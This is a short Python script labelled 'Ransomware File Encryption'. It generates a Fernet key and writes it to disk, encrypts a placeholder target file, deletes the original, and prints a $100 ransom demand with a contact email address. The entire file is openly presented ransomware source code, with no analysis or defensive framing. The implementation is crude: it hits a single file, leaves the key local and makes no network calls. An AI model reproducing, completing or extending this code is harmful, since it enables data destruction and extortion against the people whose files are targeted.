import os
import shutil
from cryptography.fernet import Fernet

# Generate a key for encryption and decryption
def generate_key():
    return Fernet.generate_key()

# Save the key to a file
def save_key(key, key_file):
    with open(key_file, 'wb') as file:
        file.write(key)

# Load the key from a file
def load_key(key_file):
    with open(key_file, 'rb') as file:
        return file.read()

# Encrypt a message using the key
def encrypt_message(message, key):
    fernet = Fernet(key)
    return fernet.encrypt(message)

# Decrypt a message using the key
def decrypt_message(encrypted_message, key):
    fernet = Fernet(key)
    return fernet.decrypt(encrypted_message).decode()

# Encrypt a file using the key
def encrypt_file(file_path, key):
    accessible_path = file_path.replace(os.sep, '_') + '.encrypted'
    with open(file_path, "rb") as fIn:
        data = fIn.read()
    encrypted_data = encrypt_message(data, key)
    with open(accessible_path, 'wb') as fOut:
        fOut.write(encrypted_data)
    # Delete the original file
    os.remove(file_path)
    print(f'File "{file_path}" encrypted and deleted successfully.')

# Main program
def main():
    print("Ransomware File Encryption")

    # Generate a random key
    key = generate_key()

    # Save the key to a file
    key_file = 'encryption_key.key'
    save_key(key, key_file)

    # Encrypt a file
    file_path = "file target  :)"
    encrypt_file(file_path, key)

    # Request payment to retrieve the data
    print("Your files have been successfully encrypted. To retrieve the data, a payment of $100 is required sade6h@gmail.com.")

if __name__ == "__main__":
    main()
